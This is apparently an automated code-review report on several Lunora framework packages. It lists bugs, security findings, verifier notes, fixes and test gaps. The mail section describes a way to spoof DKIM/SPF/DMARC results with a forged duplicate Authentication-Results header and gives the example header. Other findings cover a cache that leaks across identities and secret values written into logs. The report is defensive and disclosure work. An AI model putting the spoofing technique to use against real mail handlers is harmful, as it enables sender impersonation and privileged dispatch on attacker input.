**Assessment:** Small (~154 LOC), well-documented internal package that is fundamentally sound: env validation, bearer handling, URL joining, and the LunoraError (code, message) constructor usage are all correct, and there are no injection, secret-leak, or auth issues. The only substantive issue is that non-ok dispatch responses discard the structured Lunora error body and collapse to a generic retryable INTERNAL error, which makes deterministic failures indistinguishable from transient ones for the workflow/queue retry machinery; the rest is a doc/behavior mismatch, one reuse gap in @lunora/scheduler, and a handful of untested branches.

#### 1. [MEDIUM / bug] Non-ok dispatch responses flatten structured Lunora errors into a generic retryable INTERNAL

`packages/dispatch/src/create-dispatch-runner.ts:77`

On any !response.ok the runner throws new LunoraError("INTERNAL", `${label}: function dispatch failed (${status}): ${await response.text()}`), discarding the structured error body the dispatch endpoint returns (the runtime's handleSchedulerDispatch at packages/runtime/src/create-worker.ts:1823 throws LunoraErrors with real codes/statuses like BAD_REQUEST 400 / FORBIDDEN 403, serialized via @lunora/errors' toErrorBody). Consumers can no longer distinguish deterministic failures from transient ones: @lunora/workflow's createRunStep (packages/workflow/src/run-step.ts:83-88) keeps everything except NonRetryableError retryable, so a ctx.run call that fails validation (400 every attempt) is retried until the Cloudflare Workflows retry budget is exhausted; @lunora/queue consumers likewise message.retry() a message that can never succeed until it dead-letters. The code/status/data of the original error are also lost for any programmatic handling.

**Suggested fix:** Try JSON.parse on the error body and, when it matches the toErrorBody shape, rethrow a LunoraError carrying the original code/status/data (falling back to INTERNAL for unparseable bodies). Consumers can then map 4xx to NonRetryableError / ack-without-retry.

#### 2. [LOW / bug] Non-JSON 200 body resolves to raw text, contradicting the documented contract

`packages/dispatch/src/create-dispatch-runner.ts:87`

The JSDoc on createDispatchRunner (lines 40-42) says "an empty/non-JSON body resolves to `undefined`", but the catch at lines 86-90 returns the raw response text for non-JSON bodies. Failure scenario: an intermediary (Cloudflare error page, misconfigured proxy) returns 200 with an HTML body — the workflow/queue handler receives that HTML string as the function's "return value" and proceeds with garbage instead of failing or getting undefined. One of the two (doc or code) is wrong, and the fallback silently masks a malformed response.

**Suggested fix:** Decide the contract: either return undefined (or throw an INTERNAL LunoraError) on unparseable bodies to match the JSDoc, or fix the JSDoc to say non-JSON resolves to the raw text — and add a test pinning whichever behavior is chosen.

#### 3. [LOW / reuse] @lunora/scheduler's httpDispatcher duplicates the dispatch runner and has already diverged

`packages/scheduler/src/queue-workpool.ts:119`

@lunora/dispatch's header (create-dispatch-runner.ts:2-7) declares it "the single source of truth" for POSTing to /_lunora/scheduler/dispatch, yet packages/scheduler/src/queue-workpool.ts still carries a byte-identical trimTrailingSlashes copy (lines 36-52) and a duplicate of the URL/envelope/bearer/error-message logic in httpDispatcher (lines 119-139). Divergence has already happened: the dispatch runner binds global fetch to globalThis to avoid "Illegal invocation" in receiver-strict runtimes (create-dispatch-runner.ts:48-50), while the scheduler copy captures globalThis.fetch unbound (queue-workpool.ts:120) and would trip exactly the bug the shared runner fixed. Future fixes (e.g. the structured-error finding above) would need to be applied twice.

**Suggested fix:** Have @lunora/scheduler consume @lunora/dispatch the same way @lunora/queue and @lunora/workflow do (devDependency inlined by packem), wrapping createDispatchRunner in the void-returning QueueDispatch shape; at minimum share trimTrailingSlashes and the fetch-binding logic.

#### Missing test coverage

- create-dispatch-runner.ts:86-90 non-JSON 200 body fallback (JSON.parse throws → raw text returned) has no test — notable because it contradicts the function's JSDoc
- Envelope defaults when args/options are omitted: no test asserts the body is {args:{}, functionPath, shardKey:undefined→absent} for run(REF) with no args (the empty-body test never inspects the request body)
- create-dispatch-runner.ts:53-55 no-fetch path (fetchImpl omitted and global fetch absent) throwing the label-prefixed TypeError is untested
- trimTrailingSlashes with multiple trailing slashes (e.g. "https://x///") and with no trailing slash — tests only exercise a single trailing slash via ENV
- Empty-string env values (LUNORA_ORIGIN_URL: "" / LUNORA_ADMIN_TOKEN: "") hitting the length===0 guard — tests only cover missing keys
- createDispatchLogger debug/warn/error levels are untested (only info is asserted)

<a id="lunorado"></a>

### @lunora/do

**Assessment:** A large, unusually defensive package: external input reaches the DO only via the trusted worker (identity/system/IP headers are server-set, not client-set), raw SQL is uniformly built through drizzle bindings or schema/PRAGMA-validated quoted identifiers, admin RPCs and the SQL console are token-gated and read-only-enforced, and constant-time compares plus HMAC-signed relay frames guard the internal surfaces. Test coverage is broad (80+ suites). The one issue with real exposure is the reactive query cache keying results by userId alone; the rest are a reuse cleanup and test gaps.

#### 1. [MEDIUM / security] Reactive cache scopes results by userId only, not the full identity

`packages/do/src/reactive-cache.ts:396`

reactiveCacheKey(functionPath, args, identity: null | string) and runCachedQuery (shard-do.ts:4125 passes getCurrentUserId() ?? null) discriminate cached query results by userId alone. On the default single-**root**-DO topology every caller shares one ReactiveCache, so the userId discriminator is the ONLY thing preventing cross-caller leakage. A query whose RLS/result depends on an identity CLAIM other than userId — e.g. an org/tenant id or role from ctx.auth.getIdentity() — while userId is absent (anonymous API-key callers) or shared, memoizes the first caller's rows and serves them to a different identity. The subscription path already recognizes this hazard (isIdentityIndependent at shard-do.ts:6053 gates cross-socket dedup shut for any non-admin read), but the HTTP query-cache key cannot express a multi-field identity at all. The cache is opt-in, which bounds impact.

**Suggested fix:** Widen the identity discriminator to a stable hash of the full resolved identity (userId + claims the app can key RLS on), or document/enforce that reactiveCache requires userId-complete identities.

#### 2. [LOW / reuse] constantTimeEqual duplicated three times in-package (five repo-wide) with a behavioral divergence

`packages/do/src/relay-hub.ts:56`

constantTimeEqual is copy-pasted in relay-hub.ts, session-do.ts, and shard-do.ts (plus runtime/create-worker.ts and payment/webhook.ts). Each copy's comment claims it 'mirrors' the others, but they diverge: relay-hub.ts:57 returns early on a length mismatch (leaking length, not fully length-constant-time), while shard-do.ts:1494 and session-do.ts:116 fold a.length ^ b.length into the accumulator and loop to the longer length. The repo's shared/ folder already hosts exactly this class of zero-dependency, cross-package helper (shared/quote-identifier.ts, shared/json-response.ts, both imported by this package). Consolidating into shared/constant-time-equal.ts removes the divergence and the drift risk the comments assume away.

**Suggested fix:** Extract one implementation into shared/constant-time-equal.ts and import it in all three DO files (and ideally runtime/payment).

#### Missing test coverage

- reactive-cache: no test that two DISTINCT identities sharing a userId, or two anonymous callers with differing identity claims, receive isolated (non-shared) results — reactive-cache.test.ts only covers user_a vs user_b vs null, the exact axis where the userId-only key gap lives.
- session-do: the GC alarm() sweep is untested — no test exercises deleting expired 's:' records and re-arming setAlarm only while records remain (all 7 suites cover create/get/revoke/expire-on-read).
- session-do: resolveTtlSeconds boundary rejection is untested — negative, non-integer, zero, and > SESSION_DO_TTL_MAX (90d) values should yield 400, and validateToken should reject sub-32 / over-256-char / non-[\w-] tokens on create.
- shard-do handleBatchRpc: per-slot error isolation for a MALFORMED entry (non-object / missing functionPath) that throws in buildBatchEntryRequest before the single-call try/catch — verify one bad slot returns BATCH_ENTRY_FAILED without 500-ing the whole batch.
- where-sql compileInList: the degenerate branch where `in`/`notIn` receives a non-array (scalar) value, producing `0 = 1` / `1 = 1`, is a reachable branch with no direct assertion.

<a id="lunoraerrors"></a>

### @lunora/errors

**Assessment:** The package is in very good shape: the redaction seam (toErrorBody) is correctly fail-closed (unknown throws and internal codes never echo their message, and hint/docsUrl/data are dropped on the redacted path), the structural guard requires the type brand so foreign errors with code+status cannot ride the echo path, and the message-solution matchers were verified to still align with the real throw sites in codegen/server/do. Only two minor issues were found (an always-installed `cause` property and a thrice-duplicated unchecked catalog lookup), plus a handful of concrete test gaps around the untested branches of resolveHint/flattenHint and the redaction of data/docsUrl.

#### 1. [LOW / bug] Every LunoraError gets an own `cause` property, even when no cause was given

`packages/errors/src/base.ts:96`

`super(message ?? code, { cause: options.cause })` always passes an options object that HAS a `cause` key. Per ES2022 InstallErrorCause, `HasProperty(options, "cause")` is true, so the Error constructor installs an own (non-enumerable) `cause: undefined` property on every LunoraError. Failure scenario: any renderer/logger that gates on presence (`"cause" in err` or `Object.hasOwn(err, "cause")`) — a common pattern for cause-chain printers, including error-render libraries — will treat every LunoraError as having a cause and render/serialize a spurious `cause: undefined` entry.

**Suggested fix:** Only forward the options object when a cause exists: `super(message ?? code, options.cause === undefined ? undefined : { cause: options.cause })` (accepting that a deliberate `cause: undefined` is dropped, which matches Error semantics everywhere else in the codebase).

#### 2. [LOW / refactor] Catalog lookup `(ERROR_CATALOG as Record<string, ErrorCatalogEntry>)[code]` is duplicated in three places and does an unguarded bracket read on a plain object

`packages/errors/src/catalog.ts:139`

The identical cast-and-bracket lookup appears in packages/errors/src/base.ts:92 (LunoraError constructor), packages/errors/src/catalog.ts:139 (isInternalCode), and packages/errors/src/catalog.ts:334 (resolveHint). Because ERROR_CATALOG is a plain object literal, a code like "constructor" resolves to the inherited `Object` function instead of `undefined`; today that is accidentally harmless (Function has no `hint`/`status`/`internal` props, so every optional-chain read yields undefined), but the safety is coincidental and each new consumer of the pattern re-inherits the hazard. Concrete payoff: one helper is a single seam for prototype-key hardening and removes three casts.

**Suggested fix:** Extract a `getCatalogEntry(code: string): ErrorCatalogEntry | undefined` helper in catalog.ts using `Object.hasOwn(ERROR_CATALOG, code) ? ... : undefined`, and use it in base.ts, isInternalCode, and resolveHint.

#### Missing test coverage

- toErrorBody redaction of the sensitive fields: no test asserts that an internal-coded LunoraError constructed WITH `data`, `docsUrl`, and an explicit `hint` produces a body containing none of them (the existing test at **tests**/errors.test.ts:129 uses an INTERNAL error that carries no data/docsUrl, so a regression that leaks `data` or `docsUrl` on the redacted path in to-error-body.ts:55 would pass the suite)
- resolveHint object-form message fallback (catalog.ts:341): no test covers `resolveHint({ code: "SOME_UNKNOWN", message: "unique constraint violation on users" })` resolving via MESSAGE_SOLUTIONS when the code has no catalog hint — only the string-input form and the code-hit form are tested
- flattenHint string (non-array) branch (catalog.ts:297): only the string[] form is tested; a plain-string hint with fences/emphasis is untested
- MESSAGE_SOLUTIONS matcher coverage: only `lunora-schema-missing` is exercised; the deliberately anchored `lunora-table-duplicate` rule (requires both "already exists" AND ".extend(" per the false-positive comment at catalog.ts:224) and the write-path `lunora-runtime-unique` vs read-side NOT_UNIQUE distinction (catalog.ts:268) have no tests, so an anchor or rule-ordering regression would go unnoticed
- isLunoraError wrong-type rejection branches (guards.ts:39): no test for a branded Error whose `status` is a string or `code` is a number (rejection tests only cover a missing brand and non-Errors)
- toErrorBody with non-Error throw values: the fallback path is only tested with `new Error(...)`; a thrown string / undefined / plain object (all realistic across the RPC boundary) is untested
- LunoraError `location` option → `loc` field and `cause` propagation (base.ts:96,101): neither is asserted anywhere

<a id="lunoraflags"></a>

### @lunora/flags

**Assessment:** A small, carefully documented package in good health: the core createFlags facade, provider factories, and fail-open/fail-closed error paths are correct and well tested (comprehensive happy-path and failure-path coverage in **tests**). The findings are edge-hardening issues — a synchronous escape hatch in the documented never-throws contract, missing validation on Flagship HTTP-mode config, raw env values (potentially Secrets Store material) echoed into parse-error messages, and a shallow reimplementation of the repo's canonical stable-key encoder.

#### 1. [MEDIUM / bug] ctx.flags.* can throw synchronously despite the documented never-throws contract

`packages/flags/src/flags.ts:165`

types.ts:8-10 promises every ctx.flags method "never throws" and resolves the default on any error, and evaluate() routes all async failures through .catch (flags.ts:172-185). But memoKey (flags.ts:98-108) runs JSON.stringify on the merged per-call context synchronously, before any try/catch. A context value that JSON.stringify rejects — a circular reference (e.g. a context built from an ORM/entity object cast to EvaluationContext), or an object whose toJSON throws — makes memoKey throw a TypeError that propagates synchronously out of ctx.flags.boolean(...), failing the whole request handler instead of degrading the flag read to its default. Every other failure mode in this package (throwing identify, throwing provider factory, failing initialize, throwing resolver) is deliberately contained; this is the one uncontained path.

**Suggested fix:** Wrap the memo-key computation in try/catch; on failure, skip memoization and evaluate directly (bindClient(...).then(resolveDetails).catch(failClosed)), preserving the never-throws contract.

#### 2. [LOW / bug] Flagship HTTP mode accepts an empty or contradictory config with no validation

`packages/flags/src/providers/flagship.ts:91`

Binding mode validates env and throws a directed LunoraError with a wrangler.jsonc fix (flagship.ts:76-82). HTTP mode has zero validation: every FlagshipHttpOptions field is optional, so flagshipProvider({}) — no appId and no endpoint — and { appId, endpoint } together (documented as mutually exclusive at flagship.ts:33 and 41) both type-check and reach `new FlagshipServerProvider(options)` at line 91. Because createFlags converts any construction/initialize failure into fail-closed defaults with the error buried in EvaluationDetails.errorMessage (flags.ts:176-185), a misconfigured HTTP provider degrades every flag to its default silently, with no directed error pointing at the misconfiguration — the exact failure binding mode was hardened against.

**Suggested fix:** Mirror binding mode: in the HTTP branch, throw a directed LunoraError when neither appId nor endpoint is set, or when both are set.

#### 3. [LOW / reuse] memoKey reimplements a shallow, locale-dependent variant of the repo's canonical stable-key encoder

`packages/flags/src/flags.ts:106`

memoKey sorts only top-level context keys (flags.ts:106) and delegates nested objects to plain JSON.stringify, so two logically identical contexts with differently-ordered nested objects (e.g. { org: { id, plan } } vs { org: { plan, id } }) produce different memo keys — duplicate provider calls and potentially inconsistent flag values within one request, the exact inconsistency the memo exists to prevent (per the doc at flags.ts:143-144). It also sorts with localeCompare where the repo's canonical encoder, shared/stable-key.ts, deliberately uses a code-point comparator (stable-key.ts:34-41) and sorts recursively at every depth. This is precisely the cache-key use case shared/ was created for (it already serves @lunora/client, @lunora/react, @lunora/do).

**Suggested fix:** Use shared/stable-key.ts's stableStringify for the context portion, wrapped in try/catch (it throws on Date/non-plain objects, which EvaluationContext permits) with a skip-memoization fallback — this also fixes the synchronous-throw finding above. Note the consumer-tsconfig rule for shared/ imports (drop outDir/rootDir).

#### 4. [LOW / security] envProvider parse errors embed the full raw env value in errorMessage, leaking Secrets Store values into details/logs

`packages/flags/src/providers/env.ts:104`

The boolean parse error (env.ts:104) and number parse error (env.ts:116) interpolate the entire raw env value into errorMessage (`is not a boolean: "${value}"`). The provider's own doc (env.ts:33-35) says it reads "plain vars and Secrets Store / .dev.vars values", so secret-typed values are an explicitly supported input. errorMessage flows verbatim into EvaluationDetails (flags.ts fail-closed path and the OpenFeature SDK's error details) and from there into any logging/telemetry hooks configured via defineFlags({ hooks }) or the client logger. A secret bound as FLAG_* that is read with the wrong type (secrets essentially never parse as booleans) lands its full plaintext in application logs on every evaluation.

**Suggested fix:** Omit or truncate the raw value in parse-error messages (keep the flag key and env var name, which are enough to debug); the JSON branch (env.ts:131-134) already only reports the parser's message, which is the safer shape.

#### Missing test coverage

- createFlags `hooks` and `logger` options are never exercised — no test asserts hooks actually run on an evaluation or that the logger is set on the bound client (flags.ts:35-41); a regression that drops them during bind would pass the suite
- memoKey top-level key-order stability is untested: no test that flags.boolean(k, d, { a: 1, b: 2 }) and (k, d, { b: 2, a: 1 }) hit the memo (one provider call) — the toSorted at flags.ts:106 has no coverage
- Concurrent first-request bind: no test that provider construction + initialize happen exactly once when several _different_ flag keys evaluate in parallel on a cold isolate (the bindClient memo race, flags.ts:28-53); existing memo tests only cover identical keys
- envProvider empty/whitespace-only number value: the value.trim() === "" guard at env.ts:115 (Number("") === 0 would otherwise silently resolve 0) has no test
- flagshipProvider HTTP mode is only tested with appId config — the `endpoint` form and cacheTtl/retries/timeout passthrough in HTTP mode are untested (flagship.ts:88-91)
- No test codifies the never-throws contract against a non-JSON-serializable per-call context (circular reference) — such a test would currently fail and catch the memoKey synchronous-throw bug

<a id="lunorahyperdrive"></a>

### @lunora/hyperdrive

**Assessment:** A small, well-documented package in good health: the ctx.sql adapters and source-projection helpers are clean and thoroughly unit-tested, and the .global() dialects are backed by real-engine integration suites (pglite Postgres, mysql-memory-server MySQL 8). The two real defects are both in the dialect layer — a MySQL index key-prefix that makes any composite index containing a string field fail InnoDB's 3072-byte key limit at migration, and a Postgres catalog probe that ignores the schema dimension — plus minor interface duplication between src/types.ts and src/global-exec.ts.

#### 1. [MEDIUM / bug] MySQL indexKeyPrefix of 768 breaks every composite index that contains a string field (InnoDB 3072-byte total key limit) — **verified: confirmed**

`packages/hyperdrive/src/global-dialect.ts:139`

indexKeyPrefix returns a flat 768 for any TEXT/BLOB-typed column. Under utf8mb4 that is 768 x 4 = 3072 bytes — exactly InnoDB's whole-index key limit (DYNAMIC row format). sql-store's createGlobalTableIndexes (packages/sql-store/src/ctx-db.ts:1043-1061) appends the prefix per column and joins all index.fields, so a single-column string index lands exactly at the limit, but ANY composite index that includes a string field exceeds it: e.g. the idiomatic .index("by_project", ["projectId", "seq"]) renders `projectId`(768) + a DOUBLE = 3080 bytes, and two string fields = 6144 bytes. MySQL rejects the CREATE INDEX with ER_TOO_LONG_KEY (errno 1071, "Specified key was too long; max key length is 3072 bytes"), so runSqlGlobalTableMigrations fails and the deploy breaks. Notably the core's own rank-companion btree deliberately uses a 191-char prefix (packages/sql-store/src/ctx-db.ts:1156-1157) to stay inside the budget — the user-index path has no such headroom. The MySQL integration suite never catches this because its schema declares indexes: [] (packages/hyperdrive/**tests**/global-mysql.integration.test.ts:35).

**Suggested fix:** Either lower the per-column prefix (e.g. 191, matching the rank-companion convention and the utf8mb4 767-byte-compatible size) or have the dialect/core divide the 3072-byte budget across the index's prefixed columns. Add a MySQL integration case with a composite [string, number] and [string, string] index to lock it in.

**Verifier note:** CONFIRMED code flow, REFUTED the central limit arithmetic — the bug survives only in a meaningfully weaker form.

Confirmed by reading the code:

1. packages/hyperdrive/src/global-dialect.ts:139 — indexKeyPrefix returns a flat 768 for every TEXT/BLOB-typed column (string/id/literal/union/any → LONGTEXT, bytes → LONGBLOB). Under utf8mb4 a 768-char prefix on LONGTEXT is 3072 bytes per key part.
2. packages/sql-store/src/ctx-db.ts:1043-1064 — createGlobalTableIndexes appends the prefix per column and joins all index.fields; createIndexIfNotExists (ctx-db.ts:166-186) swallows only errno 1061 (duplicate key name), so ER_TOO_LONG_KEY (1071) propagates and runSqlGlobalTableMigrations throws, failing table provisioning.
3. User .index(name, fields) (packages/server/src/schema.ts:293-294) flows unfiltered into definition.indexes — no validator or guard restricts field kinds or count.
4. Test-coverage claim is accurate: every schema in packages/hyperdrive/**tests**/global-mysql.integration.test.ts declares indexes: [] (lines 35, 167, 216, 225), so MySQL user-index DDL is never exercised.
5. The rank-companion contrast is accurate: rankIndexColumn (ctx-db.ts:1156-1157) deliberately uses a 191-char prefix to keep composite keys within budget.

Refuted — the quantitative core of the finding: InnoDB's 3072-byte limit (DYNAMIC row format, 16K pages) is the PER-KEY-PART limit, not the whole-index limit. The total-index-key limit is 3500 bytes (ha_innobase::max_supported_key_length(); the error then reads "max key length is 3500 bytes"). Therefore:

- The finding's headline example .index("by_project", ["projectId", "seq"]) (string + DOUBLE) = 3072 + 8 = 3080 bytes ≤ 3500 and the per-part 3072 is at, not over, the part limit — this index CREATES SUCCESSFULLY. The claim "ANY composite index that includes a string field exceeds it" is false; string + number/boolean/bigint(VARCHAR(64)=256B) composites all fit.
- What DOES fail: any composite index with two or more string-family fields (3072 + 3072 = 6144 > 3500), or a string + bytes composite (3072 + 768 = 3840 > 3500). These raise ER_TOO_LONG_KEY 1071 and break the migration. Shapes like ["orgId", "status"] or a unique ["orgId", "slug"] are idiomatic in Convex-style schemas, so this is a real, reachable deploy-time failure on the MySQL Hyperdrive backend.

Severity adjustment: high → medium. It is a deterministic provisioning failure with an untested code path, but it only bites the opt-in MySQL-over-Hyperdrive .global() backend and only for composite indexes containing ≥2 string/bytes fields — the single-string-plus-scalar case the finding claimed universally broken actually works.

#### 2. [MEDIUM / bug] postgresDialect.tableExists probes information_schema without a schema filter — false positives across schemas

`packages/hyperdrive/src/global-dialect.ts:108`

The Postgres probe is `SELECT table_name FROM information_schema.tables WHERE table_name = ${table}` with no table_schema (or table_type) predicate, while the MySQL twin on line 148 correctly filters `table_schema = DATABASE()` — the asymmetry shows the omission is unintentional. In Postgres, information_schema.tables lists tables from every schema in the current database the user can see. sql-store uses this probe for the opt-in __agg_/__rank_ companion checks (counterTableExists / rankTableExists, packages/sql-store/src/ctx-db.ts:1526, 1903): if a same-named companion table exists in another schema (multi-tenant/multi-environment databases sharing one PG database with separate schemas is a common Hyperdrive setup), the probe returns true, the store takes the indexed path against the unqualified name, and the first count()/aggregate()/rankPage() (or the write-side companion maintenance) fails at runtime with `relation "__agg_..." does not exist` — or worse, silently reads/maintains the OTHER environment's companion when the foreign schema is on the search_path.

**Suggested fix:** Filter by the effective schema, e.g. `WHERE table_schema = ANY (current_schemas(false)) AND table_name = ${table}` (or `table_schema = current_schema()` if tables are always created unqualified), mirroring the MySQL dialect's DATABASE() filter.

#### 3. [LOW / refactor] RowClient and Mysql2Execute re-declare interfaces that already exist in src/types.ts

`packages/hyperdrive/src/global-exec.ts:13`

RowClient (global-exec.ts:13-15) is structurally identical to SqlClient (src/types.ts:74-90) — its own JSDoc even says it is "e.g. @lunora/hyperdrive's fromPostgresJs/fromNodePg result" — and Mysql2Execute (global-exec.ts:18-20) duplicates Mysql2Like (src/types.ts:114-116) field-for-field. Both files are in the same package, so the duplication buys nothing and the two pairs can silently drift (they already have in one spot: buildMysqlExec.all blindly casts the tuple's first element while fromMysql2 normalizes a non-array ResultSetHeader to [] — safe today only because the store core never routes DML through `all` on MySQL). The test helper (**tests**/_helpers/mysql-mem.ts:50) also needs an `as unknown as Mysql2Execute` cast that would be identical either way.

**Suggested fix:** Import SqlClient and Mysql2Like from ./types in global-exec.ts (aliasing if the exec-facing names should stay), deleting the duplicate declarations so the /global entry can never drift from the main entry's driver surfaces.

#### Missing test coverage

- MySQL secondary-index creation DDL is never exercised against real MySQL — the integration schema declares indexes: [] (**tests**/global-mysql.integration.test.ts:35), so the indexKeyPrefix path (and the composite-index key-length failure reported above) has no coverage; add composite [string, number] and unique-index cases.
- The positive MySQL OCC-conflict branch (affected-rows 0 on a concurrently-changed/deleted row -> ConflictError via mysqlDialect.affectedRows) is untested — the suite only proves the negative (idempotent patch does NOT spuriously conflict, **tests**/global-mysql.integration.test.ts:147).
- pullSourceRows default projection is untested: the only test (**tests**/source.test.ts:58-88) always supplies map and params; the no-map column-copy path and omitted-params forwarding through SqlClient.query are unexercised at this call site.
- projectSourceRow's non-scalar-id rejection (object/boolean id -> TypeError, per the liftSourceId contract) has no test — only missing and null ids are covered (**tests**/source.test.ts:45-55).
- postgresDialect.isUniqueViolation's message-regex fallback (PG_UNIQUE_VIOLATION_RE, for drivers that omit .code) is untested — **tests**/global-dialect.test.ts:23-28 only exercises the code === "23505" branch.
- The real Hyperdrive binding round-trip is an unwritten it.todo behind the CI gate (**tests**/create-hyperdrive.test.ts:137-139), so createHyperdrive has never run against an actual env.HYPERDRIVE binding.

<a id="lunoramail"></a>

### @lunora/mail

**Assessment:** A small, carefully written package with strong outbound header/CRLF-injection defenses that are consistently applied across every transport and the queue path, and generally good test coverage of those defenses. The real risks concentrate on the inbound trust path — the DKIM/SPF/DMARC verdicts the security model tells users to gate on are spoofable via a duplicate Authentication-Results header — plus a silently-failing dev capture sink and some duplicated shard-RPC plumbing that has already diverged.

#### 1. [HIGH / security] Sender can spoof DKIM/SPF/DMARC verdicts via a duplicate Authentication-Results header (last-wins flattening) — **verified: confirmed**

`packages/mail/src/inbound/parse.ts:157`

parseInboundEmail flattens headers with explicit last-wins semantics (`headers[header.key] = header.value`, line 157, comment on 155), and parseAuthentication (line 184) reads `headers["authentication-results"]` from that map. Per RFC 8601, the receiving MX (Cloudflare Email Routing) PREPENDS its Authentication-Results at the top of the message, and consumers must trust only the topmost instance (matching their authserv-id). An attacker who includes their own `Authentication-Results: ...; dkim=pass; spf=pass; dmarc=pass` header in the original message places it BELOW Cloudflare's — so last-wins surfaces the attacker's forged verdicts, and the MX's real fail verdicts are discarded. This defeats exactly the gate the package's own security docs (handler.ts lines 19-27, parse.ts lines 40-46) tell users to rely on: 'gate on email.authentication, not on from'. A `verify` hook checking `email.authentication.dkim === "pass"` is bypassable by any sender, and dispatch then runs with the admin bearer / RLS bypassed over attacker-controlled input.

**Suggested fix:** Use the FIRST (topmost) Authentication-Results occurrence rather than the flattened last-wins map — iterate `parsed.headers` and take the first match — and ideally verify its authserv-id matches the expected receiving MX (e.g. starts with the recipient domain / Cloudflare's authserv-id). Document that verdicts below a non-matching authserv-id are ignored.

**Verifier note:** Confirmed real. postal-mime 2.7.5 delivers `parsed.headers` in document order (mime-node.js builds headers backward, then postal-mime.js:481-483 `.reverse()`s them → topmost header first, bottommost last). parse.ts:154-158 then flattens with explicit last-wins (`headers[header.key] = header.value`), so a duplicated key's BOTTOMMOST occurrence overwrites the topmost. parse.ts:184 feeds `headers["authentication-results"]` (the bottommost AR) into parseAuthentication, whose authVerdict regex (line 120-125) scans that single value for dkim/spf/dmarc=pass with NO authserv-id matching and NO topmost/trusted-boundary selection. Cloudflare's genuine AR is prepended at the top; an attacker's forged AR in the original message sits below it → later in document order → last-wins surfaces the attacker's forged pass verdicts and discards the MX's real ones. This defeats the exact `email.authentication` gate the package's own security docs (handler.ts:19-27, parse.ts:40-46) tell users to rely on, and a `verify` hook checking `email.authentication.dkim === "pass"` is bypassable by any sender, after which dispatchToLunoraFunction runs the target under the admin bearer with RLS bypassed (handler.ts:24-27, 254-296) over attacker-controlled input. Refutation attempts all failed: no upstream guard, no type constraint prevents it, input is reachable from arbitrary inbound senders, tests only pin the single-header happy path, and the only theoretical mitigation (Cloudflare stripping pre-existing AR headers) doesn't save the library because it matches on no authserv-id — an attacker using any non-matching authserv-id still lands a forged verdict that last-wins picks. A correct implementation must select the topmost AR matching a trusted authserv-id; this code does neither. Severity high is justified: it silently breaks the advertised sender-authentication trust boundary and enables privileged, RLS-bypassed dispatch on spoofed-authenticated input.

#### 2. [MEDIUM / bug] createCaptureSink ignores RPC failures — captured mail silently dropped, or json() throws on non-JSON errors

`packages/mail/src/from-env.ts:108`

The sink posts to the shard RPC and immediately does `await response.json()` with no `response.ok` check and no inspection of an `{ error }` envelope (lines 102-110). If the shard returns 401 (wrong LUNORA_ADMIN_TOKEN), 404, or 500 with a JSON error body, the sink returns `{ id: "captured" }` — the send() reports success while the message never lands in the studio inbox, silently losing dev mail (including auth verification / password-reset mail the docstring says must show up). If the error response body isn't JSON, `.json()` throws instead, contradicting the documented 'best-effort: a send never fails for lack of somewhere to record' contract. The sibling dispatchToLunoraFunction (inbound/handler.ts lines 283-295) checks both `response.ok` and the error envelope — the two paths have already diverged.

**Suggested fix:** Check `response.ok` and the `{ error }` envelope; on failure either console.error a loud diagnostic and return the sentinel (true best-effort), or throw — but never return a success id for a failed record.

#### 3. [LOW / bug] Any unrecognized LUNORA_MAIL_CAPTURE value (e.g. "yes", "on") is treated as an explicit capture-OFF override

`packages/mail/src/from-env.ts:73`

shouldCaptureMail short-circuits on `typeof flag === "string"` and returns `flag === "1" || flag.toLowerCase() === "true"` (lines 72-74). A developer setting `LUNORA_MAIL_CAPTURE=yes` (or `on`, or a typo like `ture`) in a dev environment gets capture silently disabled — the env-based dev detection on lines 76-80 is never consulted — so `createMailerFromEnv` falls through to a real transport: real provider sends from a dev box (if RESEND_API_KEY is present) or a confusing 'no transport configured' throw. The doc comment only defines "1"/"true" vs "0"/"false", but the code makes every other string mean false rather than 'unset'.

**Suggested fix:** Only treat the recognized values ("1"/"true"/"0"/"false") as an explicit override; for any other string, fall through to the environment-based detection (optionally logging a warning about the unrecognized value).

#### 4. [LOW / bug] extractLink returns HTML-entity-broken URLs from html bodies (&amp; not decoded)

`packages/mail/src/testing.ts:114`

URL_PATTERN (`/https?:\/\/[^\s"'<>)]+/g`) is run over the raw `mail.html` without entity decoding. @react-email/render (the package's own render path) escapes `&` as `&amp;` inside href attributes, so a reset link like `https://x.test/reset?uid=1&token=abc` is captured as `https://x.test/reset?uid=1&amp;token=abc`. Following that URL in a Playwright flow sends a parameter literally named `amp;token`, so any multi-query-param action link — the primary use case documented on the function ('request reset → read the email → follow the link') — 404s or fails token lookup. Only single-param links happen to work; the existing test (testing.test.ts line 63) uses hand-written HTML without escaping, so the bug is invisible.

**Suggested fix:** Decode the common entities (&amp;, &#x26;, etc.) in the extracted match before returning it, or prefer extracting from `mail.text` first (plain text is not entity-escaped) and fall back to html.

#### 5. [LOW / perf] toBase64 builds a per-byte string with String.fromCodePoint in a loop — slow for real attachment sizes

`packages/mail/src/inbound/handler.ts:201`

The default resolveArgs base64-encodes every binary attachment via `for (const byte of bytes) binary += String.fromCodePoint(byte)` (lines 201-211). One function call per byte plus incremental string growth is markedly slow for the multi-megabyte attachments inbound email routinely carries (Cloudflare Email Routing accepts messages up to 25MB), and this runs inside the email Worker's CPU budget on every inbound message with a binary part. This is the hot path of the batteries-included dispatcher, not test code.

**Suggested fix:** Encode in chunks — e.g. `String.fromCharCode(...bytes.subarray(i, i + 0x8000))` accumulated into an array joined once, then btoa — or use Uint8Array.prototype.toBase64() where available; both are orders of magnitude faster with identical output.

#### 6. [LOW / refactor] Admin-RPC-over-shard POST is duplicated between createCaptureSink and dispatchToLunoraFunction — and has already drifted

`packages/mail/src/from-env.ts:102`

createCaptureSink (from-env.ts lines 100-110) and dispatchToLunoraFunction (inbound/handler.ts lines 273-295) both build the identical request: applyJurisdiction → idFromName(shardKey) → stub.fetch("https://shard.internal/rpc", { POST, Bearer adminToken, JSON envelope }); both also independently define `DEFAULT_ROOT_SHARD = "__root__"` (from-env.ts line 32, handler.ts line 198). The predicted drift has already happened: the dispatcher validates `response.ok` and the error envelope while the sink does neither (see the medium bug above). Both files explicitly cross-reference each other as 'the same path'.

**Suggested fix:** Extract a shared `postShardRpc(namespace, { shardKey, jurisdiction, adminToken, envelope })` helper (natural home: src/inbound/shard.ts, which both already import) that owns the URL, headers, ok-check, and error-envelope check, plus the single DEFAULT_ROOT_SHARD constant. Fixing the sink bug then falls out for free.

#### Missing test coverage

- inbound/parse.ts: no test that a sender-forged duplicate Authentication-Results header (below the MX-stamped one) cannot override the verdicts — the exact spoofing scenario the security docs warn about is unexercised.
